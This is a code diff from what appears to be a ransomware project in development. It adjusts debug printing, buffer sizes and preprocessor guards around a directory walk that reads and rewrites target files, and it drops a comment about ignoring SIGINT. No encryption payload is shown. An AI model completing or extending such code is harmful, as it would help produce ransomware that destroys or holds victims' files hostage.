@@ -1,15 +1,18 @@
 #include "fournights.h"
+
 /**
   * debug_list - prints elements of the target_file_buf struct
   * @target_file_buf: lala
   */
+#ifndef DEBUG
+#define DEBUG
 void debug_list(target_file_t *target_file_buf)
 {
-	printf("\n\nDEBUG\n");
 	printf("--------%s--------\n", target_file_buf->filepath);
 	printf("bytes_read: %d\n", (int)target_file_buf->bytes_read);
 	printf("file_offset: %d\n", (int)target_file_buf->file_offset);
 	printf("st_size: %d\n", (int)target_file_buf->file_info.st_size);
+	printf("%s", target_file_buf->buf);
 	getchar();
 }
 /**
@@ -37,6 +40,7 @@ void print_for_debug(struct ransom_s ransom)
 	printf("DEBUG 3: \n");
 	print_list(ransom.target_files);
 }
+#endif
 
 /**
   * free_ransom_struct - Frees all malloced space in the struct
@@ -121,9 +125,6 @@ node_t *recurse_ls(char *dirname, ransom_t *ransom)
   * @ac: argument count
   * @av: argument vectors
   * Return: 0
-  * Trap Signals: Disabled for debugging
-  * if (signal(SIGINT, SIG_IGN) == SIG_ERR)
-  *		puts("signal error\n");
   * TODO: putting the list of files into a linked list is a massive race condition bug.
   *       It is acceptable here for development
   * TODO: need to eliminate hard coded strings.
@@ -149,8 +150,8 @@ int main(int ac, char *av[])
 	ransom.target_file_buf = target_file;
 
 /* build target_file_s part of ransom struct */
-	ransom.target_file_buf->filepath = my_calloc(BUFSIZE, sizeof(char));
-	ransom.target_file_buf->buf = my_calloc((BUFSIZE * 4) * sizeof(char), sizeof(char));
+	ransom.target_file_buf->filepath = my_calloc(BIGBUF, sizeof(char));
+	ransom.target_file_buf->buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
 	ransom.target_file_buf->file_offset = 0;
 	ransom.target_file_buf->bytes_read = 0;
 
@@ -172,26 +173,25 @@ int main(int ac, char *av[])
 	walk = ransom.target_files;
 	while(walk)
 	{
-		printf("--------%s--------\n", walk->str);
 		my_strncat(ransom.target_file_buf->filepath, walk->str, 0, my_strlen(walk->str));
 		do
 		{
-			/** DEBUGGING **/
-			debug_list(ransom.target_file_buf);
-
 			bytes_read = ransom.target_file_buf->bytes_read = read_file(walk->str, &ransom, write_file);
+#ifndef DEBUG_H
+			debug_list(ransom.target_file_buf);
+#endif
 		}
 		while(ransom.target_file_buf->file_offset < ransom.target_file_buf->file_info.st_size);
 
+		/* reset bytes read and file_offset */
 		ransom.target_file_buf->file_offset = 0;
 		ransom.target_file_buf->bytes_read = 0;
 		walk = walk->next;
 	}
-	/* print struct for debugging*/
-	/*
+#ifndef DEBUG_H
 	print_for_debug(ransom);
-	*/
 	print_list(ransom.target_files);
+#endif
 	free_ransom_struct(&ransom);
 	free(target_file->buf);
 	free(target_file->filepath);
